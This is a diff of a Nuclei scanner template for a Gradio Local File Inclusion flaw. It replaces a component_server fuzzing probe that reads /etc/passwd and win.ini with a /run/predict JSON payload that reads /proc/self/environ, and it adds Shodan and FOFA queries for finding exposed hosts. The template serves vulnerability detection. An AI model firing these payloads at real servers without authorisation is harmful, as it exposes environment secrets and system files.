@@ -1,86 +1,56 @@
 id: gradio-lfi
 
 info:
-  name: Gradio 3.47/3.50.2 - Local File Inclusion
-  author: nvn1729
-  severity: high
+  name: Gradio - Local File Inclusion
+  author: ritikchaddha
+  severity: critical
   description: |
-    Local file read by calling arbitrary methods of Components class between Gradio versions 3.47 / 3.50.2
+    Gradio's Dropdown component is vulnerable to Local File Inclusion (LFI) when the value is a dictionary controlled by an attacker. In the postprocess of components, if the value type is a dict, it flows to the async_move_files_to_cache function. When the dictionary is crafted with a "path" key, it causes local file inclusion allowing attackers to read arbitrary files.
   reference:
-    - https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2
-    - https://www.horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/
+    - https://huntr.com/bounties/936ef084-45e1-4dc5-a419-bca071189565
   classification:
-    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
-    epss-percentile: 0.36659
-    cpe: cpe:2.3:a:gradio_project:gradio:*:*:*:*:python:*:*:*
+    cwe-id: CWE-20
   metadata:
-    verified: true
-    max-request: 2
-    shodan-query: html:"__gradio_mode__"
+    max-request: 1
+    vendor: gradio_app
     product: gradio
-    vendor: gradio_project
-  tags: cve,cve2024,intrusive,unauth,gradio,lfi,lfr
-
-flow: http(1) && http(2)
+    shodan-query:
+      - http.html:"__gradio_mode__"
+      - http.title:"gradio"
+    fofa-query:
+      - body="__gradio_mode__"
+      - title="gradio"
+    google-query: intitle:"gradio"
+  tags: lfi,gradio,file-inclusion
 
 http:
   - raw:
       - |
-        GET / HTTP/1.1
-        Host: {{Hostname}}
-
-      - |
-        GET /component_server HTTP/1.1
-        Host: {{Hostname}}
-
-    matchers:
-      - type: dsl
-        dsl:
-          - 'contains_any(tolower(body), "content=\"gradio", "gradio_mode", "gradio-app", "https://gradio.app")'
-          - 'contains(tolower(body), "\"method not allowed")'
-        condition: or
-        internal: true
-
-  - raw:
-      - |
-        POST /component_server HTTP/1.1
+        POST /run/predict HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/json
 
-        {"component_id": "{{fuzz_component_id}}", "data": "{{path}}", "fn_name": "make_temp_copy_if_needed", "session_hash": "aaaaaaaaaaa"}
+        {"data":["{\"path\":\"/proc/self/environ\"}"],"event_data":null,"fn_index":0,"trigger_id":2,"session_hash":"ig8gs2fazn"}
 
-      - |
-        GET /file={{download_path}} HTTP/1.1
-        Host: {{Hostname}}
-
-    extractors:
-      - type: regex
-        part: body
-        name: download_path
-        internal: true
-        group: 1
-        regex:
-          - "\"?([^\"]+)"
-
-    attack: clusterbomb
-    payloads:
-      fuzz_component_id: helpers/wordlists/numbers.txt
-      path:
-        - /etc/passwd
-        - c:\\windows\\win.ini
-
-    stop-at-first-match: true
     matchers-condition: and
     matchers:
-      - type: regex
-        part: body_2
-        regex:
-          - "root:.*:0:0:"
-          - "\\[(font|extension|file)s\\]"
-        condition: or
+      - type: word
+        part: body
+        words:
+          - 'url":'
+          - 'path":"'
+          - 'data":[{'
+          - 'FileData'
+        condition: and
+
+      - type: word
+        part: content_type
+        words:
+          - application/json
 
       - type: status
         status:
           - 200
-# digest: 4a0a004730450221009a000e16a75bee5fabcaf424bc6a4ef85edb5554dec6737c24637259b95fdda902200a2197986cc155b93aeb2031ed6b9b739ca870bc9ea168098e5aa9161dc2eb89:922c64590222798bb761d5b6d8e72950
+# digest: 490a00463044022061514a06a61e9b258ca96bf387995ba18354efd17ec6ad6a4ae842e17d2e278c02204ad249bdae5d231cafc6109a2dde502e8b7eb2af18f109c6ff32f5b60853e093:922c64590222798bb761d5b6d8e72950
